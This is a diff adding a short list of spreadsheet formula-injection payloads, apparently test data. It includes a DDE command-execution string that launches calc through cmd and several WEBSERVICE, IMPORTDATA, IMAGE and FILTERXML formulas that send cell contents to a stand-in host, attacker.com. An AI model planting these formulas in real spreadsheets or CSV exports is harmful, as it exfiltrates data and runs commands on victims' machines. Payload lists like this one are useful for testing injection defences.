@@ -1,0 +1,12 @@
+Payload
+=1+1
+=SUM(1,1)
+=CHAR(65)&CHAR(66)
+=CONCAT("=","cmd|' /C calc'!A0")
+=INDIRECT("A1")
+=WEBSERVICE("http://attacker.com/?x="&A1)
+=WEBSERVICE(CONCATENATE("http://attacker.com/",A1))
+=IMPORTDATA("http://attacker.com/")
+=IMAGE("http://attacker.com/track.gif")
+=ENCODEURL(A1)
+=FILTERXML(WEBSERVICE("http://attacker.com/?x="&A1),"//a")
